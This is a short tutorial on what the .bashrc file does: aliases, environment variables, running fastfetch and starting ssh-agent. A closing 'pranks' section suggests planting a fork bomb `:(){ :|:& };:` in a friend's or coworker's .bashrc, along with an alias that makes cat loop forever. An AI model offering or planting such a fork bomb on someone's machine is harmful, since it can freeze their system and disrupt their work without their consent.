## How do we run certain command when you open a terminal?

File called `.bashrc` is located in the home directory (if it exists - if not you have to create it) and is a bash script that is ran each time you open a terminal. 
<https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html>

### Aliasing commands 
like `alias dog=cat` (cat is a command that prints files to standard output)
<https://man7.org/linux/man-pages/man1/cat.1.html>
<https://man7.org/linux/man-pages/man1/alias.1p.html>

### Exporting environment variables
like directories you often visit `export NVCONF=$HOME/.config` or executables `export MYCXX=$HOME/toolchains/bin/g++` 
<https://www.man7.org/linux/man-pages/man1/export.1p.html>

### Running a custom script
Making it execute `fastfetch` or `neofetch` each time you open it
<https://github.com/fastfetch-cli/fastfetch>

### Starting and connecting SSH sessions 
Like you can do for github
```sh
eval `ssh-agent -s`
ssh-add path/to/your/private/key # usually somewhere in $HOME/.ssh/ ... you have to generate it first and put it there
```
<https://docs.github.com/en/authentication/connecting-to-github-with-ssh/about-ssh>

### Pulling funny pranks on your friends or coworkers
Depending on how much you like them you can
* simply just call them a nerd `echo "Hello, Nerd!"` <https://man7.org/linux/man-pages/man1/echo.1.html>
* change random commands to do other stuff - put `alias cat='yes meow'` (command that keeps printing meow forever in a loop) <https://man7.org/linux/man-pages/man1/yes.1.html>
* execute a forkbomb each time they open a terminal `:(){ :|:& };:` <https://en.wikipedia.org/wiki/Fork_bomb>
